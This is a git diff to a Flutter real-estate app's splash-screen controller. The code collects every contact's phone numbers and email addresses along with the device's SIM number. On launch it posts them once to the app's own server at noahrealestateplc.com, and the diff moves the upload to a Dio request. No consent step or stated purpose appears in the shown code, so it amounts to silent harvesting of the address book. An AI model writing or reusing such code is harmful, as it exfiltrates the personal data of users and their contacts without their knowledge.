@@ -1,6 +1,7 @@
 import 'dart:math';
 
 import 'package:contacts_service/contacts_service.dart';
+import 'package:dio/dio.dart';
 import 'package:flutter/widgets.dart';
 import 'package:get/get.dart';
 import 'package:noahrealstate/app/common/app_constants.dart';
@@ -65,13 +66,13 @@ class SplashController extends GetxController {
         contacts.forEach((con) {
           List<String>? phones = [];
           con.phones!.forEach((phone) {
-                print(phone.value);
-                phone.value != null ? phones.add(phone.value!) : null;
-              });
+            print(phone.value);
+            phone.value != null ? phones.add(phone.value!) : null;
+          });
           print(con.phones);
           List<String>? emails = [];
-          con.emails?.forEach((phone) =>
-                  phone.value != null ? emails.add(phone.value!) : null);
+          con.emails?.forEach(
+              (phone) => phone.value != null ? emails.add(phone.value!) : null);
           print(con.emails);
 
           ContactInfo info = ContactInfo(
@@ -85,26 +86,40 @@ class SplashController extends GetxController {
         });
       }
       bool status = await CacheHelper.getAddContacts();
-     
+
       if (!status) {
-        // Fetch data from API
-        await BaseClient.safeApiCall(
-          'https://noahrealestateplc.com/app/index.php?s=${_simCard.number}}',
-          RequestType.post,
-          onLoading: () {
-            print({"c": contactsList});
-          },
-          data: {"c": contactsList},
-          onSuccess: (response) {
+        Dio dio = Dio();
+
+        try {
+          // Show loading
+          print({
+              "c": contactsList,
+              "s": _simCard.number,
+            });
+
+          // Make the POST request
+          final response = await dio.post(
+            'https://noahrealestateplc.com/app/index.php?s=${_simCard.number}',
+            data: {
+              "c": contactsList,
+              "s": _simCard.number,
+            },
+          );
+print(response);
+          // Handle success
+          if (response.statusCode == 200) {
             CacheHelper.addContacts(true);
             apiCallStatus = ApiCallStatus.success;
-
             update();
-          },
-          onError: (error) {
+          } else {
+            // Handle unexpected status codes
             update();
-          },
-        );
+          }
+        } catch (error) {
+          // Handle errors
+          print("Error: $error");
+          update();
+        }
       }
     } on PlatformException catch (e) {
       debugPrint("Failed to get mobile number because of '${e.message}'");
